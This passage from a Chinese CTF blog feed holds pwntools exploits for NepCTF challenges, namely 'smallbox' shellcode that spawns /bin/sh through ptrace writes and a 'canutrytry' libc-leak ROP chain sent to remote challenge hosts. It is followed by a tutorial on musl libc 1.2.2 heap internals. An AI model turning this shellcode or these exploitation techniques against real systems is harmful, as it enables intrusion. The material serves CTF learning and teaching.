class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">ggg = <span class="keyword">lambda</span>              :(gdb.attach(p),pause())</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = gdb.debug(&#x27;./smallbox&#x27;, &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#     b _start</span></span><br><span class="line"><span class="comment">#     c</span></span><br><span class="line"><span class="comment">#     set follow-fork-mode parent</span></span><br><span class="line"><span class="comment">#     b *$rebase(0x13e2)</span></span><br><span class="line"><span class="comment">#     c</span></span><br><span class="line"><span class="comment"># &#x27;&#x27;&#x27;)</span></span><br><span class="line"><span class="comment"># p=process(&#x27;./smallbox&#x27;)</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;nepctf32-ameg-qqf5-f9qf-wpvdlbusv409.nepctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">child_shcode = asm(<span class="string">&quot;nop; &quot;</span> * <span class="number">10</span> + <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">push   0x42</span></span><br><span class="line"><span class="string">pop    rax</span></span><br><span class="line"><span class="string">inc    ah</span></span><br><span class="line"><span class="string">cqo</span></span><br><span class="line"><span class="string">push   rdx</span></span><br><span class="line"><span class="string">movabs rdi, 0x68732f2f6e69622f</span></span><br><span class="line"><span class="string">push   rdi</span></span><br><span class="line"><span class="string">push   rsp</span></span><br><span class="line"><span class="string">pop    rsi</span></span><br><span class="line"><span class="string">mov    r8, rdx</span></span><br><span class="line"><span class="string">mov    r10, rdx</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">nop;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov r15, [rsp+8]</span></span><br><span class="line"><span class="string">shr r15, 32</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rax, 101;</span></span><br><span class="line"><span class="string">mov rdi, 16;</span></span><br><span class="line"><span class="string">mov rsi, r15;</span></span><br><span class="line"><span class="string">mov rdx, 0;</span></span><br><span class="line"><span class="string">mov r10, 0;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rax, 101;</span></span><br><span class="line"><span class="string">mov rdi, 12;</span></span><br><span class="line"><span class="string">mov rsi, r15;</span></span><br><span class="line"><span class="string">mov rdx, 0;</span></span><br><span class="line"><span class="string">lea r10, [rsp + 104];</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">payload=asm(payload)</span><br><span class="line"></span><br><span class="line">write_bytes = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(child_shcode), <span class="number">4</span>):</span><br><span class="line">write_bytes += <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov rax, 101;</span></span><br><span class="line"><span class="string">mov rdi, 4;</span></span><br><span class="line"><span class="string">mov rsi, r15;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdx, [rsp + 104 + 128];</span></span><br><span class="line"><span class="string">add rdx, <span class="subst">&#123;i&#125;</span>;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov r10, <span class="subst">&#123;u32(child_shcode[i:i+<span class="number">4</span>].rjust(<span class="number">4</span>,<span class="string">b&quot;0&quot;</span>))&#125;</span>;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">payload += asm(write_bytes)</span><br><span class="line"></span><br><span class="line">payload += asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rax, 101;</span></span><br><span class="line"><span class="string">mov rdi, 17;</span></span><br><span class="line"><span class="string">mov rsi, r15;</span></span><br><span class="line"><span class="string">mov rdx, 0;</span></span><br><span class="line"><span class="string">mov r10, 0;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov eax, 1</span></span><br><span class="line"><span class="string">loop:</span></span><br><span class="line"><span class="string">test eax, 1</span></span><br><span class="line"><span class="string">jne loop;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sa(<span class="string">b&#x27;shellcode: \n&#x27;</span>,payload)</span><br><span class="line">sleep(<span class="number">5</span>)</span><br><span class="line">shell()</span><br></pre></td></tr></table></figure><h2 id="canutrytry"><a href="#canutrytry" class="headerlink" title="canutrytry"></a>canutrytry</h2><p>只是一道和C++抛出异常有关的题，之前没见过，看着别人的exp慢慢调的，边调边学，很有意思 <a href="https://www.cnblogs.com/xmiscx/p/19010430#_label0">参考文章</a></p><p>这里就简单放个exp了，<a href="https://gggtaotao.github.io/2025/07/30/pwn-c-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E5%88%A9%E7%94%A8/">具体分析会放在另一篇文章中</a>，连同如何获取配套的依赖库并更换的方法（走了很多坑，大哭呜呜呜）</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-v&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;190&quot;</span>]</span><br><span class="line"></span><br><span class="line">libc_base=<span class="number">0x0</span></span><br><span class="line">heap_base=<span class="number">0x0</span></span><br><span class="line">pie=<span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getshell</span>() : <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> a : p.recv(a)</span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a  : p.recvuntil(a)</span><br><span class="line">s = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">shell = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">li = <span class="keyword">lambda</span> offset        :libc_base+offset</span><br><span class="line">lis= <span class="keyword">lambda</span> func          :libc_base+libc.symbols[func]</span><br><span class="line">pi = <span class="keyword">lambda</span> offset        :pie+offset</span><br><span class="line">he = <span class="keyword">lambda</span> offset        :heap_base+offset</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">ggg = <span class="keyword">lambda</span>              :(gdb.attach(p),pause())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">visit_1</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;your choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;your choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">visit_2</span>(<span class="params">size</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;your choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;your choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">visit_3</span>(<span class="params">index,content</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;your choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;your choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;index:&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    sa(<span class="string">b&#x27;content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leave</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;your choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># p=process(&#x27;./canutrytry&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;nepctf30-re0p-1yod-ovkd-tywcgo6zc386.nepctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>)</span><br><span class="line">visit_2(<span class="number">0x38</span>)</span><br><span class="line">visit_1()</span><br><span class="line">visit_2(-<span class="number">1</span>)</span><br><span class="line">visit_1()</span><br><span class="line">ru(<span class="string">b&#x27;setbufaddr:0x&#x27;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(ru(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>],<span class="number">16</span>)-<span class="number">0x87fe0</span>-<span class="number">0x80</span></span><br><span class="line">ru(<span class="string">b&#x27;stackaddr:0x&#x27;</span>)</span><br><span class="line">stack=<span class="built_in">int</span>(ru(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0x405460</span>)+p64(<span class="number">0x401ed9</span>)</span><br><span class="line"></span><br><span class="line">rdi=li(<span class="number">0x000000000002a3e5</span>)</span><br><span class="line">rsi=li(<span class="number">0x000000000002be51</span>)</span><br><span class="line">rdx_r12=li(<span class="number">0x000000000011f497</span>)</span><br><span class="line">write=lis(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">visit_3(<span class="number">0</span>,payload)</span><br><span class="line">leave(<span class="number">0</span>)</span><br><span class="line">payload=p64(rdi)+p64(<span class="number">2</span>)+p64(rsi)+p64(<span class="number">0x4053c0</span>)+p64(rdx_r12)+p64(<span class="number">0x64</span>)+p64(<span class="number">0</span>)+p64(write)</span><br><span class="line">sla(<span class="string">b&#x27;well,prepare your rop now!\n&#x27;</span>,payload)</span><br><span class="line">sla(<span class="string">b&#x27;Enter your flag: &#x27;</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0x405458</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">s(payload)</span><br><span class="line">shell()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> Nepnep </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>musl_libc_pwn学习</title>
      <link href="/2025/07/25/musl-libc-pwn%E5%AD%A6%E4%B9%A0/"/>
      <url>/2025/07/25/musl-libc-pwn%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="musl-libc学习（1-2-2）"><a href="#musl-libc学习（1-2-2）" class="headerlink" title="musl_libc学习（1.2.2）"></a>musl_libc学习（1.2.2）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>1.1.xx的版本已经很老了，估计也不会遇到了，所以这里就不再学习了<del>主要是因为本人太懒了</del>，目前musl-libc已经出到了1.2.5-3了，但是貌似能搜到的题只有1.2.2的，所以学习一下1.2.2的堆管理结构，以及如何利用</p><p>(文章内容为个人见解，有错误的话欢迎大佬批评指出)</p><h2 id="环境布置"><a href="#环境布置" class="headerlink" title="环境布置"></a>环境布置</h2><p>musl-libc是集libc和ld为一体的，所以只要一个libc.so就够了，要调试musl的题，调试符号是必不可少的，但是从其他大佬的博客来看，都是要下载调试符号包，然后加载，本人鼓捣了半天，结果还是加载不出调试符号(可能是操作有误)，ubuntu要下载各个版本的调试符号包以及各种包的话可以去官网，<a href="https://launchpad.net/ubuntu/+source/musl">这里放个链接</a></p><h3 id="加载调试符号"><a href="#加载调试符号" class="headerlink" title="加载调试符号"></a>加载调试符号</h3><p>因为实在加载不出符号调试表，所以直接在源码编译的时候加了调试符号，直接使用带有调试符号的libc.so</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/桌面/musl</span><br><span class="line">wget https://musl.libc.org/releases/musl-1.2.2.tar.gz <span class="comment">#下载源码安装包</span></span><br><span class="line">tar -zxvf musl-1.2.2.tar.gz <span class="comment">#解压</span></span><br><span class="line"><span class="built_in">cd</span> musl-1.2.2</span><br><span class="line">./configure CFLAGS=<span class="string">&quot;-g -O0&quot;</span> --prefix=/usr/local/musl-1.2.2 <span class="comment"># 配置编译参数，启用调试符号（-g）并禁用优化（-O0），并指定了安装路径/usr/local/musl-1.2.2 ，可自行修改</span></span><br><span class="line">make -j4 <span class="comment"># 编译（-j4 表示使用4线程加速）</span></span><br><span class="line"><span class="built_in">sudo</span> make install <span class="comment"># 安装到指定目录，也就是上面的/usr/local/musl-1.2.2</span></span><br></pre></td></tr></table></figure><p>之后可以在path to/musl-1.2.2/lib下找到libc.so文件，此文件是加载了调试符号的</p><h3 id="muslheap插件"><a href="#muslheap插件" class="headerlink" title="muslheap插件"></a>muslheap插件</h3><p>安利<strong>xf1les</strong> 师傅编写的musl heap gdb 插件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/xf1les/muslheap.git</span><br></pre></td></tr></table></figure><p>安装方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;source /path/to/muslheap.py&quot;</span> &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure><p>具体使用方法以及环境要求在read.me文件里有，这里不再赘述，安装好之后就可以使用mheap等调试musl很方便的指令了</p><h3 id="patchelf换libc"><a href="#patchelf换libc" class="headerlink" title="patchelf换libc"></a>patchelf换libc</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter /path to your/libc.so ./pwn <span class="comment">#将要调试的文件使用的libc更换为上述增加了调试符号的libc.so</span></span><br></pre></td></tr></table></figure><h3 id="编译使用musl的程序"><a href="#编译使用musl的程序" class="headerlink" title="编译使用musl的程序"></a>编译使用musl的程序</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/path to your/musl-1.2.2/bin/musl-gcc -g test.c -o <span class="built_in">test</span></span><br><span class="line">patchelf --set-interpreter /path to your/libc.so ./test <span class="comment">#你编译出来的elf还是会使用本地的libc.so，记得换成你加载了调试符号的libc.so</span></span><br></pre></td></tr></table></figure><p>编译musl程序，需要用到musl-gcc，上述加载调试符号时编译的源码里就有，因为版本是1.2.2的，所以编译出来的文件也是1.2.2的如果要编译其他版本的elf的话，和上述操作类似，下载一份其他版本的源码，编译好之后用配套的musl-gcc编译即可</p><h2 id="堆管理结构学习"><a href="#堆管理结构学习" class="headerlink" title="堆管理结构学习"></a>堆管理结构学习</h2><p>musl的堆管理结构和glibc的区别还是挺大的，musl的堆管理结构没有bins，而是通过meta_area管理meta，meta管理group，group管理chunk来实现的，其中__malloc_context又记录着meta的情况以及meta_area的情况，网上很多博客关于此结构已经写的很清楚了，这里主要写一下我自己的见解，放几个链接大家可以参考一下</p><p><a href="https://bbs.kanxue.com/thread-269533-1.htm">链接1</a></p><p><a href="https://www.anquanke.com/post/id/253566">链接2</a></p><p><a href="https://blog.xmcve.com/2022/08/08/musl基础知识整理/#title-8">链接3</a></p><h3 id="malloc-context"><a href="#malloc-context" class="headerlink" title="__malloc_context"></a>__malloc_context</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_context</span> &#123;</span></span><br><span class="line">   <span class="type">uint64_t</span> secret;<span class="comment">// 和meta_area 头的check 是同一个值 就是校验值</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PAGESIZE</span></span><br><span class="line">   <span class="type">size_t</span> pagesize;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">   <span class="type">int</span> init_done;<span class="comment">//是否初始化标记</span></span><br><span class="line">   <span class="type">unsigned</span> mmap_counter;<span class="comment">// 记录有多少mmap 的内存的数量</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">free_meta_head</span>;</span><span class="comment">// 被free 的meta 头 这里meta 管理使用了队列和双向循环链表</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">avail_meta</span>;</span><span class="comment">//指向可用meta数组</span></span><br><span class="line">   <span class="type">size_t</span> avail_meta_count, avail_meta_area_count, meta_alloc_shift;</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">meta_area_head</span>, *<span class="title">meta_area_tail</span>;</span></span><br><span class="line">   <span class="type">unsigned</span> <span class="type">char</span> *avail_meta_areas;</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">active</span>[48];</span><span class="comment">// 记录着可用的meta</span></span><br><span class="line">   <span class="type">size_t</span> u sage_by_class[<span class="number">48</span>];</span><br><span class="line">   <span class="type">uint8_t</span> unmap_seq[<span class="number">32</span>], bounces[<span class="number">32</span>];</span><br><span class="line">   <span class="type">uint8_t</span> seq;</span><br><span class="line">   <span class="type">uintptr_t</span> brk;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-07-25%20150108.png" alt="屏幕截图 2025-07-25 150108"></p><p>1.active数组中储存着不同大小的meta，分别在对应的位置，如管理大小为0x30chunk的meta在active[2]，这些meta通过双向循环链表连接 来</p><p>2.avail_meta表示剩余的可用的meta数量，上图为87，如果我没有malloc 0x40大小的chunk的话，上图就不会有active[3]，那么avail_meta的数量应该是88</p><p>3.free_meta表示已经释放的meta数量，这里为0</p><p>4.avail_meta_area表示可用的meta_area,如图表示下一个可用的meta_area的位置是0x653909391000</p><p>5.meta_area_head和tail分别指向meat_area链表的头部和尾部，这里因为只有一个meta_area，所以指向相同的地方</p><h3 id="meta-area"><a href="#meta-area" class="headerlink" title="meta_area"></a>meta_area</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> check;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">int</span> nslots;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">slots</span>[];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-07-28%20112640.png" alt="屏幕截图 2025-07-28 112640"></p><p>1.check和malloc_context中的<code>uint64_t secret</code> 是一样的</p><p>2.next是用来维护meta_area链表的，这个结构是通过单链表维护的</p><p>3.nslots记录着当前使用的meta数量</p><p>4.meta slots[]就是存储着一系列的meta</p><p>一般一个meta_area的大小是一页，也就是0x1000，然后前0x18的大小是自身结构，也就是check，next，nslots，之后便是一个一个的meta</p><h3 id="meta"><a href="#meta" class="headerlink" title="meta"></a>meta</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span>   <span class="comment">//双向链表</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span>          <span class="comment">// 这里指向管理的group 地址</span></span><br><span class="line">   <span class="keyword">volatile</span> <span class="type">int</span> avail_mask, freed_mask;</span><br><span class="line">   <span class="type">uintptr_t</span> last_idx:<span class="number">5</span>;</span><br><span class="line">   <span class="type">uintptr_t</span> freeable:<span class="number">1</span>;</span><br><span class="line">   <span class="type">uintptr_t</span> sizeclass:<span class="number">6</span>;</span><br><span class="line">   <span class="type">uintptr_t</span> maplen:<span class="number">8</span>*<span class="keyword">sizeof</span>(<span class="type">uintptr_t</span>)<span class="number">-12</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-07-25%20150931.png" alt="屏幕截图 2025-07-25 150931"></p><p>1.prev和next分别指向此meta的上一个meta和下一个meta，通过此结构双向链表的结构连接起来</p><p>2.mem记录着此meta对应的group的地址在哪</p><p>3.last_idx的数字意味着这个meta最多可以管理几个chunk，[0~last_idx]，上图所示的话也就是10个</p><p>4.freeable代表这个meta可不可以被释放，1为可以</p><p>5.sizeclass代表这个meta管理的chunk的大小，此图是2，和上图的active[2]是对应的，也就是管理的0x30大小的chunk</p><p>6.avail_mask和freed_mask都要转变成二进制看：</p><p>512的二进制是0b1000000000,意味着我已经申请了9个chunk（对应0）只剩最后一个chunk没有申请了</p><p>20的二进制是0b10100，意味着编号为2，4的chunk被free掉了</p><h3 id="group"><a href="#group" class="headerlink" title="group"></a>group</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> &#123;</span>   </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span>;</span><span class="comment">// meta的地址</span></span><br><span class="line">   <span class="type">unsigned</span> <span class="type">char</span> active_idx:<span class="number">5</span>;</span><br><span class="line">   <span class="type">char</span> pad[UNIT - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> meta *) - <span class="number">1</span>];<span class="comment">// 保证0x10字节对齐</span></span><br><span class="line">   <span class="type">unsigned</span> <span class="type">char</span> storage[];<span class="meta"># chunk</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-07-25%20151945.png" alt="屏幕截图 2025-07-25 151945"></p><p>group的前8字节记录着此group对应的meta的地址，active_idx，也就是9，记录着此group管理的chunk的数量</p><p>至于pad，还没明白是用来干什么的，有知道的可以佬可以说一下</p><p>接着就是chunk里的内容了如图0x6161这些是chunk里的内容</p><h3 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span>&#123;</span></span><br><span class="line"> <span class="type">char</span> prev_user_data[];</span><br><span class="line">   <span class="type">uint8_t</span> idx;        <span class="comment">//低5bit为idx第几个chunk</span></span><br><span class="line">   <span class="type">uint16_t</span> offset;    <span class="comment">//与第一个chunk起始地址的偏移，实际地址偏移为offset * UNIT,详细请看get_meta源码中得到group地址的而过程！</span></span><br><span class="line">   <span class="type">char</span> data[];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-07-25%20152455.png" alt="屏幕截图 2025-07-25 